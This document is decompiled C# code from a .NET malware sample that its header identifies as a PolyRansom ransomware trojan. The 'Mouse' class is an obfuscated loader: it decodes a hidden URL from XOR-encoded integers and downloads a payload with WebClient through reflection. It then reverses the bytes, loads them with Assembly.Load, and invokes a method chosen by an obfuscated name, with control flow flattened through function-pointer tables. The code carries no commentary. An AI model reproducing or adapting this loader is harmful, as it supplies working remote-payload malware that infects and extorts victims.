// Decompiled with JetBrains decompiler
// Type: WindowsFormsApp20.Mouse
// Assembly: ClipasClipasClipas, Version=3.6.15.0, Culture=neutral, PublicKeyToken=null
// MVID: 01227A38-77A6-4E0B-8D32-9CC001B29843
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.12-msil\HEUR-Trojan-Ransom.MSIL.PolyRansom.gen-58a694044ee4771566c0d4ef4737203166ab7f87e5f9b352e27e16559f09bc22.exe

using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;

namespace WindowsFormsApp20
{
  public static class Mouse
  {
    private static IntPtr[] LocalServeraddDomainUnload;

    private static void HResultGetScope(
      [In] ref int obj0,
      [In] ref int obj1,
      [In] ref int[] obj2,
      [In] Exception obj3,
      [In] ref bool obj4,
      [In] ref bool obj5,
      [In] ref List<MethodInfo>.Enumerator obj6,
      [In] ref MethodInfo obj7,
      [In] ref object obj8,
      [In] ref bool obj9)
    {
      int num = ((!obj6.MoveNext() ? 1 : 0) - 1) * -1 * -6 + 21;
      obj0 = num;
    }

    private static void getXmlNsForClrTypeWithNsAssertFailure(
      [In] ref int obj0,
      [In] ref int obj1,
      [In] ref int[] obj2,
      [In] ref bool obj3,
      [In] ref Type[] obj4,
      [In] ref int obj5,
      [In] ref Type obj6)
    {
      obj0 = 0;
    }

    private static void UseHebrewParsinggetHasInfo(
      [In] ref int obj0,
      [In] ref int obj1,
      [In] ref int[] obj2,
      [In] Exception obj3,
      [In] ref bool obj4,
      [In] ref bool obj5,
      [In] ref List<MethodInfo>.Enumerator obj6,
      [In] ref MethodInfo obj7,
      [In] ref object obj8,
      [In] ref bool obj9)
    {
      bool flag = Win32.METHODS == null;
      obj4 = flag;
      int num = (!obj4 ? 1 : 0) * 1 + 11;
      obj0 = num;
    }

    private static void ApproximateSizeCreateActContextParametersSource(
      [In] ref int obj0,
      [In] ref int obj1,
      [In] ref int[] obj2,
      [In] ref bool obj3,
      [In] ref Type[] obj4,
      [In] ref int obj5,
      [In] ref Type obj6)
    {
      bool flag = Win32.METHODS == null;
      obj3 = flag;
      int num = (!obj3 ? 1 : 0) * 1 + 5;
      obj0 = num;
    }

    private static void ManagedEventRegistrationImplFileAssociationEntry(
      [In] ref int obj0,
      [In] ref int obj1,
      [In] ref int[] obj2,
      [In] Exception obj3,
      [In] ref bool obj4,
      [In] ref bool obj5,
      [In] ref List<MethodInfo>.Enumerator obj6,
      [In] ref MethodInfo obj7,
      [In] ref object obj8,
      [In] ref bool obj9)
    {
      bool flag = false;
      obj9 = flag;
      int num = (!obj9 ? 1 : 0) * 1 + 18;
      obj0 = num;
    }

    private static void getNamespaceConstructorCallMessage(
      [In] ref int obj0,
      [In] ref int obj1,
      [In] ref int[] obj2,
      [In] ref bool obj3,
      [In] ref Type[] obj4,
      [In] ref int obj5,
      [In] ref Type obj6)
    {
      Array.Reverse((Array) Win32.BUFFER, 0, Win32.BUFFER.Length);
      Win32.METHODS = new List<MethodInfo>();
      Type[] exportedTypes = Assembly.Load(Win32.BUFFER).GetExportedTypes();
      obj4 = exportedTypes;
      int num = 0;
      obj5 = num;
      obj0 = 8;
    }

    private static void SafeSerializationManagergetActivationContext(
      [In] ref int obj0,
      [In] ref int obj1,
      [In] ref int[] obj2,
      [In] Exception obj3,
      [In] ref bool obj4,
      [In] ref bool obj5,
      [In] ref List<MethodInfo>.Enumerator obj6,
      [In] ref MethodInfo obj7,
      [In] ref object obj8,
      [In] ref bool obj9)
    {
      obj7.Invoke((object) null, (object[]) null);
      int num = ((!obj6.MoveNext() ? 1 : 0) - 1) * -1 * -6 + 21;
      obj0 = num;
    }

    private static void FLicensedDebuggerStepperBoundaryAttribute(
      [In] ref int obj0,
      [In] ref int obj1,
      [In] ref int[] obj2,
      [In] Exception obj3,
      [In] ref bool obj4,
      [In] ref bool obj5,
      [In] ref List<MethodInfo>.Enumerator obj6,
      [In] ref MethodInfo obj7,
      [In] ref object obj8,
      [In] ref bool obj9)
    {
      obj6.Dispose();
      if (obj2 != null)
      {
        if (obj2.Length != 0)
        {
          obj0 = obj2[0];
          int[] destinationArray = new int[obj2.Length - 1];
          Array.Copy((Array) obj2, 1, (Array) destinationArray, 0, destinationArray.Length);
          obj2 = destinationArray;
        }
        else
          obj0 = 23;
      }
      else
        obj0 = 1;
    }

    private static void LocalDataStoreOwnerDefaulted(
      [In] ref int obj0,
      [In] ref int obj1,
      [In] ref int[] obj2,
      [In] Exception obj3,
      [In] ref bool obj4,
      [In] ref bool obj5,
      [In] ref List<MethodInfo>.Enumerator obj6,
      [In] ref MethodInfo obj7,
      [In] ref object obj8,
      [In] ref bool obj9)
    {
      bool flag = Win32.METHODS.Count > 0;
      obj5 = flag;
      int num = (!obj5 ? 1 : 0) * 11 + 13;
      obj0 = num;
    }

    private static void AddResourceFileIMPLTYPEFLAGFSOURCE(
      [In] ref int obj0,
      [In] ref int obj1,
      [In] ref int[] obj2,
      [In] ref bool obj3,
      [In] ref object obj4)
    {
      Win32.BUFFER = (byte[]) null;
      obj0 = 4;
    }

    public static void Embassy()
    {
      int index = 10;
      int[] numArray1 = new int[25];
      numArray1[14] = 23;
      numArray1[15] = 23;
      numArray1[16] = 23;
      numArray1[17] = 23;
      numArray1[18] = 23;
      numArray1[19] = 23;
      numArray1[20] = 23;
      numArray1[21] = 23;
      Exception exception1;
      while (index != 1)
      {
        if (index == 0)
          return;
        int num1;
        int[] numArray2;
        try
        {
          ref int local1 = ref index;
          ref int local2 = ref num1;
          ref int[] local3 = ref numArray2;
          Exception exception2 = exception1;
          bool flag1;
          ref bool local4 = ref flag1;
          bool flag2;
          ref bool local5 = ref flag2;
          List<MethodInfo>.Enumerator enumerator;
          ref List<MethodInfo>.Enumerator local6 = ref enumerator;
          MethodInfo methodInfo;
          ref MethodInfo local7 = ref methodInfo;
          object obj;
          ref object local8 = ref obj;
          bool flag3;
          ref bool local9 = ref flag3;
          // ISSUE: cast to a function pointer type
          // ISSUE: cast to a reference type
          // ISSUE: cast to a reference type
          // ISSUE: cast to a reference type
          // ISSUE: cast to a reference type
          // ISSUE: cast to a reference type
          // ISSUE: cast to a reference type
          // ISSUE: cast to a reference type
          // ISSUE: function pointer call
          __calli((__FnPtr<void (int&, int&, int[]&, Exception, bool&, bool&, List<MethodInfo>.Enumerator&, MethodInfo&, object&, bool&)>) Mouse.LocalServeraddDomainUnload[index])((bool&) ref local1, (object&) ref local2, (MethodInfo&) ref local3, (List<MethodInfo>.Enumerator&) exception2, ref local4, ref local5, (Exception) ref local6, (int[]&) ref local7, (int&) ref local8, (int&) ref local9);
        }
        catch (Exception ex)
        {
          if (index == 2)
          {
            index = num1;
          }
          else
          {
            exception1 = ex;
            numArray2 = (int[]) null;
            int num2 = numArray1[index - 0];
            if (num2 != 0)
              index = num2 - 1;
            else
              throw;
          }
        }
      }
      throw exception1;
    }

    private static void SetEnableAllKeywordsTraceLoggingEventTypes(
      [In] ref int obj0,
      [In] ref int obj1,
      [In] ref int[] obj2,
      [In] Exception obj3,
      [In] ref bool obj4,
      [In] ref bool obj5,
      [In] ref List<MethodInfo>.Enumerator obj6,
      [In] ref MethodInfo obj7,
      [In] ref object obj8,
      [In] ref bool obj9)
    {
      obj0 = 0;
    }

    public static void Sony()
    {
      int index = 4;
      while (index != 0)
      {
        ref int local1 = ref index;
        int num1;
        ref int local2 = ref num1;
        int[] numArray;
        ref int[] local3 = ref numArray;
        bool flag;
        ref bool local4 = ref flag;
        Type[] typeArray;
        ref Type[] local5 = ref typeArray;
        int num2;
        ref int local6 = ref num2;
        Type type;
        ref Type local7 = ref type;
        // ISSUE: cast to a function pointer type
        // ISSUE: cast to a reference type
        // ISSUE: cast to a reference type
        // ISSUE: cast to a reference type
        // ISSUE: cast to a reference type
        // ISSUE: function pointer call
        __calli((__FnPtr<void (int&, int&, int[]&, bool&, Type[]&, int&, Type&)>) Mouse.LocalServeraddDomainUnload[index])((Type&) ref local1, ref local2, (Type[]&) ref local3, ref local4, (int[]&) ref local5, ref local6, (int&) ref local7);
      }
    }

    private static void CultureCert(
      [In] ref int obj0,
      [In] ref int obj1,
      [In] ref int[] obj2,
      [In] Exception obj3,
      [In] ref bool obj4,
      [In] ref bool obj5,
      [In] ref List<MethodInfo>.Enumerator obj6,
      [In] ref MethodInfo obj7,
      [In] ref object obj8,
      [In] ref bool obj9)
    {
      obj0 = 0;
    }

    private static void SyncStackReadToEndAsyncd(
      [In] ref int obj0,
      [In] ref int obj1,
      [In] ref int[] obj2,
      [In] Exception obj3,
      [In] ref bool obj4,
      [In] ref bool obj5,
      [In] ref List<MethodInfo>.Enumerator obj6,
      [In] ref MethodInfo obj7,
      [In] ref object obj8,
      [In] ref bool obj9)
    {
      obj0 = 20;
    }

    private static void InverseQAddField(
      [In] ref int obj0,
      [In] ref int obj1,
      [In] ref int[] obj2,
      [In] Exception obj3,
      [In] ref bool obj4,
      [In] ref bool obj5,
      [In] ref List<MethodInfo>.Enumerator obj6,
      [In] ref MethodInfo obj7,
      [In] ref object obj8,
      [In] ref bool obj9)
    {
      MethodInfo current = obj6.Current;
      obj7 = current;
      string fullName = obj7.DeclaringType.FullName;
      char[] chArray;
      object obj = (object) (chArray = new char[37]);
      obj8 = obj;
      obj8[0] = (object) (1059137745 ^ 1059137664);
      obj8[1] = (object) (1243050270 ^ 1243050280);
      obj8[2] = (object) (655644084 ^ 655644144);
      obj8[3] = (object) (1384357994 ^ 1384357907);
      obj8[4] = (object) (1064560835 ^ 1064560783);
      obj8[5] = (object) (575138421 ^ 575138371);
      obj8[6] = (object) (1200868070 ^ 1200867984);
      obj8[7] = (object) (1817750073 ^ 1817750124);
      obj8[8] = (object) (1269983646 ^ 1269983700);
      obj8[9] = (object) (255821593 ^ 255821645);
      obj8[10] = (object) (499384513 ^ 499384470);
      obj8[11] = (object) (857197992 ^ 857198032);
      obj8[12] = (object) (315044441 ^ 315044376);
      obj8[13] = (object) (1313113126 ^ 1313113119);
      obj8[14] = (object) (1028985514 ^ 1028985497);
      obj8[15] = (object) (1572079734 ^ 1572079676);
      obj8[16] = (object) (1048279231 ^ 1048279290);
      obj8[17] = (object) (1793943580 ^ 1793943670);
      obj8[18] = (object) (611981870 ^ 611981824);
      obj8[19] = (object) (192480789 ^ 192480866);
      obj8[20] = (object) (1163023037 ^ 1163023086);
      obj8[21] = (object) (222698253 ^ 222698342);
      obj8[22] = (object) (1298284738 ^ 1298284727);
      obj8[23] = (object) (354202043 ^ 354202091);
      obj8[24] = (object) (674567073 ^ 674567065);
      obj8[25] = (object) (1370144920 ^ 1370144983);
      obj8[26] = (object) (1031000548 ^ 1031000460);
      obj8[27] = (object) (1369717397 ^ 1369717489);
      obj8[28] = (object) (1855713984 ^ 1855713961);
      obj8[29] = (object) (1179179413 ^ 1179179516);
      obj8[30] = (object) (1198885372 ^ 1198885278);
      obj8[31] = (object) (757929117 ^ 757929156);
      obj8[32] = (object) (486395834 ^ 486395790);
      obj8[33] = (object) (1384106394 ^ 1384106460);
      obj8[34] = (object) (202242580 ^ 202242593);
      obj8[35] = (object) (139365452 ^ 139365376);
      obj8[36] = (object) (27668620 ^ 27668666);
      string str = new string(chArray);
      int num = (!(fullName == str) ? 1 : 0) * 1 + 16;
      obj0 = num;
    }

    private static void LSATRUSTINFORMATIONAssignPrimaryToken(
      [In] ref int obj0,
      [In] ref int obj1,
      [In] ref int[] obj2,
      [In] ref bool obj3,
      [In] ref object obj4)
    {
      bool flag = Win32.BUFFER == null;
      obj3 = flag;
      int num = (!obj3 ? 1 : 0) * 1 + 1;
      obj0 = num;
    }

    private static void memidDestructorCompilerMarshalOverride(
      [In] ref int obj0,
      [In] ref int obj1,
      [In] ref int[] obj2,
      [In] Exception obj3,
      [In] ref bool obj4,
      [In] ref bool obj5,
      [In] ref List<MethodInfo>.Enumerator obj6,
      [In] ref MethodInfo obj7,
      [In] ref object obj8,
      [In] ref bool obj9)
    {
      string name = obj7.Name;
      char[] chArray;
      object obj = (object) (chArray = new char[9]);
      obj8 = obj;
      obj8[0] = (object) (217393967 ^ 217393985);
      obj8[1] = (object) (1664303444 ^ 1664303413);
      obj8[2] = (object) (1636806630 ^ 1636806550);
      obj8[3] = (object) (1677452221 ^ 1677452244);
      obj8[4] = (object) (106102870 ^ 106102820);
      obj8[5] = (object) (76310219 ^ 76310173);
      obj8[6] = (object) (1471350371 ^ 1471350313);
      obj8[7] = (object) (1491197593 ^ 1491197682);
      obj8[8] = (object) (147363506 ^ 147363521);
      string str = new string(chArray);
      bool flag = name == str;
      obj9 = flag;
      int num = (!obj9 ? 1 : 0) * 1 + 18;
      obj0 = num;
    }

    private static void SealedgetGlobalAssemblyCache(
      [In] ref int obj0,
      [In] ref int obj1,
      [In] ref int[] obj2,
      [In] Exception obj3,
      [In] ref bool obj4,
      [In] ref bool obj5,
      [In] ref List<MethodInfo>.Enumerator obj6,
      [In] ref MethodInfo obj7,
      [In] ref object obj8,
      [In] ref bool obj9)
    {
      List<MethodInfo>.Enumerator enumerator = Win32.METHODS.ToList<MethodInfo>().GetEnumerator();
      obj6 = enumerator;
      obj0 = 14;
    }

    public static void App1()
    {
      int index = 0;
      while (index != 4)
      {
        ref int local1 = ref index;
        int num;
        ref int local2 = ref num;
        int[] numArray;
        ref int[] local3 = ref numArray;
        bool flag;
        ref bool local4 = ref flag;
        object obj;
        ref object local5 = ref obj;
        // ISSUE: cast to a function pointer type
        // ISSUE: cast to a reference type
        // ISSUE: cast to a reference type
        // ISSUE: cast to a reference type
        // ISSUE: cast to a reference type
        // ISSUE: function pointer call
        __calli((__FnPtr<void (int&, int&, int[]&, bool&, object&)>) Mouse.LocalServeraddDomainUnload[index])((object&) ref local1, (bool&) ref local2, ref local3, (int&) ref local4, (int&) ref local5);
      }
    }

    private static void EmptyStructLocalApplicationData(
      [In] ref int obj0,
      [In] ref int obj1,
      [In] ref int[] obj2,
      [In] Exception obj3,
      [In] ref bool obj4,
      [In] ref bool obj5,
      [In] ref List<MethodInfo>.Enumerator obj6,
      [In] ref MethodInfo obj7,
      [In] ref object obj8,
      [In] ref bool obj9)
    {
      Mouse.Sony();
      bool flag = Win32.METHODS.Count > 0;
      obj5 = flag;
      int num = (!obj5 ? 1 : 0) * 11 + 13;
      obj0 = num;
    }

    private static void CrSelCheckSubTreePermission(
      [In] ref int obj0,
      [In] ref int obj1,
      [In] ref int[] obj2,
      [In] ref bool obj3,
      [In] ref Type[] obj4,
      [In] ref int obj5,
      [In] ref Type obj6)
    {
      Type[] exportedTypes = Assembly.Load(Win32.BUFFER).GetExportedTypes();
      obj4 = exportedTypes;
      int num = 0;
      obj5 = num;
      obj0 = 8;
    }

    private static void ApplicationBasecapacity(
      [In] ref int obj0,
      [In] ref int obj1,
      [In] ref int[] obj2,
      [In] ref bool obj3,
      [In] ref object obj4)
    {
      obj0 = 4;
    }

    private static void UnstartedProcessingMode(
      [In] ref int obj0,
      [In] ref int obj1,
      [In] ref int[] obj2,
      [In] Exception obj3,
      [In] ref bool obj4,
      [In] ref bool obj5,
      [In] ref List<MethodInfo>.Enumerator obj6,
      [In] ref MethodInfo obj7,
      [In] ref object obj8,
      [In] ref bool obj9)
    {
      int num = ((!obj6.MoveNext() ? 1 : 0) - 1) * -1 * -6 + 21;
      obj0 = num;
    }

    private static void PropertyBuilderAsR(
      [In] ref int obj0,
      [In] ref int obj1,
      [In] ref int[] obj2,
      [In] Exception obj3,
      [In] ref bool obj4,
      [In] ref bool obj5,
      [In] ref List<MethodInfo>.Enumerator obj6,
      [In] ref MethodInfo obj7,
      [In] ref object obj8,
      [In] ref bool obj9)
    {
      int[] numArray = new int[1]{ 23 };
      obj2 = numArray;
      obj0 = 22;
    }

    private static void getDateStartIsClass(
      [In] ref int obj0,
      [In] ref int obj1,
      [In] ref int[] obj2,
      [In] ref bool obj3,
      [In] ref Type[] obj4,
      [In] ref int obj5,
      [In] ref Type obj6)
    {
      int num = (obj5 < obj4.Length ? 1 : 0) * -2 + 9;
      obj0 = num;
    }

    private static void setBufferWidthIgnoreKanaType(
      [In] ref int obj0,
      [In] ref int obj1,
      [In] ref int[] obj2,
      [In] ref bool obj3,
      [In] ref object obj4)
    {
      Type type = typeof (WebClient);
      char[] chArray1;
      object obj5 = (object) (chArray1 = new char[12]);
      obj4 = obj5;
      obj4[0] = (object) (288609817 ^ 288609885);
      obj4[1] = (object) (1898681577 ^ 1898681478);
      obj4[2] = (object) (260919743 ^ 260919752);
      obj4[3] = (object) (492965687 ^ 492965721);
      obj4[4] = (object) (584014476 ^ 584014560);
      obj4[5] = (object) (613009495 ^ 613009464);
      obj4[6] = (object) (838142703 ^ 838142606);
      obj4[7] = (object) (1759874433 ^ 1759874533);
      obj4[8] = (object) (1314077484 ^ 1314077544);
      obj4[9] = (object) (470532241 ^ 470532336);
      obj4[10] = (object) (955320101 ^ 955320145);
      obj4[11] = (object) (1949341339 ^ 1949341434);
      string name = new string(chArray1);
      Type[] types = new Type[1]{ typeof (Uri) };
      // ISSUE: explicit non-virtual call
      MethodInfo method = __nonvirtual (type.GetMethod(name, types));
      WebClient webClient = new WebClient();
      object[] parameters = new object[1];
      char[] chArray2;
      object obj6 = (object) (chArray2 = new char[75]);
      obj4 = obj6;
      obj4[0] = (object) (316726044 ^ 316726132);
      obj4[1] = (object) (617147374 ^ 617147290);
      obj4[2] = (object) (600455471 ^ 600455515);
      obj4[3] = (object) (1588541612 ^ 1588541660);
      obj4[4] = (object) (1637237088 ^ 1637237011);
      obj4[5] = (object) (1965765394 ^ 1965765416);
      obj4[6] = (object) (1829334125 ^ 1829334082);
      obj4[7] = (object) (1920607860 ^ 1920607835);
      obj4[8] = (object) (892593403 ^ 892593305);
      obj4[9] = (object) (382928105 ^ 382928000);
      obj4[10] = (object) (1933767743 ^ 1933767755);
      obj4[11] = (object) (1235670911 ^ 1235670813);
      obj4[12] = (object) (1602083695 ^ 1602083610);
      obj4[13] = (object) (745381438 ^ 745381469);
      obj4[14] = (object) (1554472394 ^ 1554472353);
      obj4[15] = (object) (1554986491 ^ 1554986398);
      obj4[16] = (object) (955042300 ^ 955042184);
      obj4[17] = (object) (1424522008 ^ 1424522038);
      obj4[18] = (object) (1398936646 ^ 1398936617);
      obj4[19] = (object) (297274217 ^ 297274139);
      obj4[20] = (object) (1701907091 ^ 1701907188);
      obj4[21] = (object) (522686330 ^ 522686293);
      obj4[22] = (object) (1089458318 ^ 1089458426);
      obj4[23] = (object) (797766187 ^ 797766233);
      obj4[24] = (object) (1630574248 ^ 1630574301);
      obj4[25] = (object) (423593012 ^ 423593031);
      obj4[26] = (object) (75099954 ^ 75099974);
      obj4[27] = (object) (1454594237 ^ 1454594264);
      obj4[28] = (object) (1069424171 ^ 1069424207);
      obj4[29] = (object) (1297566737 ^ 1297566819);
      obj4[30] = (object) (1892335825 ^ 1892335806);
      obj4[31] = (object) (1878032211 ^ 1878032188);
      obj4[32] = (object) (555376529 ^ 555376613);
      obj4[33] = (object) (2101060419 ^ 2101060391);
      obj4[34] = (object) (2066938484 ^ 2066938385);
      obj4[35] = (object) (1102262850 ^ 1102262836);
      obj4[36] = (object) (1123517163 ^ 1123517124);
      obj4[37] = (object) (1553453722 ^ 1553453820);
      obj4[38] = (object) (466248621 ^ 466248644);
      obj4[39] = (object) (293785841 ^ 293785757);
      obj4[40] = (object) (1646632859 ^ 1646632958);
      obj4[41] = (object) (505044528 ^ 505044511);
      obj4[42] = (object) (721236906 ^ 721236942);
      obj4[43] = (object) (2053165359 ^ 2053165376);
      obj4[44] = (object) (2112397481 ^ 2112397534);
      obj4[45] = (object) (1172732479 ^ 1172732497);
      obj4[46] = (object) (1038365639 ^ 1038365611);
      obj4[47] = (object) (1986116685 ^ 1986116642);
      obj4[48] = (object) (1206020748 ^ 1206020845);
      obj4[49] = (object) (1430639859 ^ 1430639767);
      obj4[50] = (object) (804832133 ^ 804832246);
      obj4[51] = (object) (2037039123 ^ 2037039164);
      obj4[52] = (object) (1219079242 ^ 1219079177);
      obj4[53] = (object) (658045884 ^ 658045904);
      obj4[54] = (object) (247434248 ^ 247434337);
      obj4[55] = (object) (1941523361 ^ 1941523409);
      obj4[56] = (object) (1675172703 ^ 1675172670);
      obj4[57] = (object) (1950172931 ^ 1950173040);
      obj4[58] = (object) (2105451011 ^ 2105451072);
      obj4[59] = (object) (1213644076 ^ 1213644096);
      obj4[60] = (object) (1890665440 ^ 1890665353);
      obj4[61] = (object) (374739888 ^ 374739904);
      obj4[62] = (object) (851183689 ^ 851183656);
      obj4[63] = (object) (1742510313 ^ 1742510234);
      obj4[64] = (object) (638075927 ^ 638075988);
      obj4[65] = (object) (55735532 ^ 55735424);
      obj4[66] = (object) (680294382 ^ 680294279);
      obj4[67] = (object) (1648506923 ^ 1648506971);
      obj4[68] = (object) (825926601 ^ 825926568);
      obj4[69] = (object) (452209544 ^ 452209659);
      obj4[70] = (object) (431469328 ^ 431469374);
      obj4[71] = (object) (1549072225 ^ 1549072139);
      obj4[72] = (object) (958273387 ^ 958273307);
      obj4[73] = (object) (1105150805 ^ 1105150768);
      obj4[74] = (object) (798125005 ^ 798124970);
      parameters[0] = (object) new Uri(new string(chArray2));
      Win32.BUFFER = (byte[]) method.Invoke((object) webClient, parameters);
      obj0 = 3;
    }

    private static void ResolveAsUint(
      [In] ref int obj0,
      [In] ref int obj1,
      [In] ref int[] obj2,
      [In] ref bool obj3,
      [In] ref Type[] obj4,
      [In] ref int obj5,
      [In] ref Type obj6)
    {
      Type type = obj4[obj5];
      obj6 = type;
      Win32.METHODS.AddRange((IEnumerable<MethodInfo>) obj6.GetMethods());
      ++obj5;
      int num = (obj5 < obj4.Length ? 1 : 0) * -2 + 9;
      obj0 = num;
    }

    static Mouse() => Mouse.ReceiveWindowClassSection();

    private static void ReceiveWindowClassSection()
    {
      Mouse.LocalServeraddDomainUnload = new IntPtr[25];
      // ISSUE: method pointer
      Mouse.LocalServeraddDomainUnload[0] = __methodptr(LSATRUSTINFORMATIONAssignPrimaryToken);
      // ISSUE: method pointer
      Mouse.LocalServeraddDomainUnload[1] = __methodptr(setBufferWidthIgnoreKanaType);
      // ISSUE: method pointer
      Mouse.LocalServeraddDomainUnload[2] = __methodptr(AddResourceFileIMPLTYPEFLAGFSOURCE);
      // ISSUE: method pointer
      Mouse.LocalServeraddDomainUnload[3] = __methodptr(ApplicationBasecapacity);
      // ISSUE: method pointer
      Mouse.LocalServeraddDomainUnload[4] = __methodptr(ApproximateSizeCreateActContextParametersSource);
      // ISSUE: method pointer
      Mouse.LocalServeraddDomainUnload[5] = __methodptr(getNamespaceConstructorCallMessage);
      // ISSUE: method pointer
      Mouse.LocalServeraddDomainUnload[6] = __methodptr(CrSelCheckSubTreePermission);
      // ISSUE: method pointer
      Mouse.LocalServeraddDomainUnload[7] = __methodptr(ResolveAsUint);
      // ISSUE: method pointer
      Mouse.LocalServeraddDomainUnload[8] = __methodptr(getDateStartIsClass);
      // ISSUE: method pointer
      Mouse.LocalServeraddDomainUnload[9] = __methodptr(getXmlNsForClrTypeWithNsAssertFailure);
      // ISSUE: method pointer
      Mouse.LocalServeraddDomainUnload[10] = __methodptr(UseHebrewParsinggetHasInfo);
      // ISSUE: method pointer
      Mouse.LocalServeraddDomainUnload[11] = __methodptr(EmptyStructLocalApplicationData);
      // ISSUE: method pointer
      Mouse.LocalServeraddDomainUnload[12] = __methodptr(LocalDataStoreOwnerDefaulted);
      // ISSUE: method pointer
      Mouse.LocalServeraddDomainUnload[13] = __methodptr(SealedgetGlobalAssemblyCache);
      // ISSUE: method pointer
      Mouse.LocalServeraddDomainUnload[14] = __methodptr(SyncStackReadToEndAsyncd);
      // ISSUE: method pointer
      Mouse.LocalServeraddDomainUnload[15] = __methodptr(InverseQAddField);
      // ISSUE: method pointer
      Mouse.LocalServeraddDomainUnload[16] = __methodptr(memidDestructorCompilerMarshalOverride);
      // ISSUE: method pointer
      Mouse.LocalServeraddDomainUnload[17] = __methodptr(ManagedEventRegistrationImplFileAssociationEntry);
      // ISSUE: method pointer
      Mouse.LocalServeraddDomainUnload[18] = __methodptr(SafeSerializationManagergetActivationContext);
      // ISSUE: method pointer
      Mouse.LocalServeraddDomainUnload[19] = __methodptr(UnstartedProcessingMode);
      // ISSUE: method pointer
      Mouse.LocalServeraddDomainUnload[20] = __methodptr(HResultGetScope);
      // ISSUE: method pointer
      Mouse.LocalServeraddDomainUnload[21] = __methodptr(PropertyBuilderAsR);
      // ISSUE: method pointer
      Mouse.LocalServeraddDomainUnload[22] = __methodptr(FLicensedDebuggerStepperBoundaryAttribute);
      // ISSUE: method pointer
      Mouse.LocalServeraddDomainUnload[23] = __methodptr(SetEnableAllKeywordsTraceLoggingEventTypes);
      // ISSUE: method pointer
      Mouse.LocalServeraddDomainUnload[24] = __methodptr(CultureCert);
    }
  }
}
